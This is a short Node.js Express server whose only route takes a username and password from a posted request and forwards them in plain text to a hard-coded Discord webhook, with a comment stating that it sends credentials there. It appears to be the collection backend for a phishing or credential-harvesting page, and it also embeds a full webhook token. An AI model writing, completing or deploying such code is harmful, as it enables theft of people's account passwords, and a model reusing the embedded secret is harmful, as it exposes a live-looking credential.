const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');

const app = express();
const port = 3000;

app.use(bodyParser.json());

// Your Discord webhook URL
const webhookUrl = 'https://discord.com/api/webhooks/1392097289312669706/fB1OBrcMJNeLCFESzE2sQb7wRwDoLTFkswZzn9boImiCDqpYghPBk_X0PBkCvZjI26rB';

app.post('/webhook', async (req, res) => {
    const { username, password } = req.body;

    // Send credentials to Discord webhook
    await axios.post(webhookUrl, {
        content: `Username: ${username}\nPassword: ${password}`
    });

    res.sendStatus(200);
});

app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});


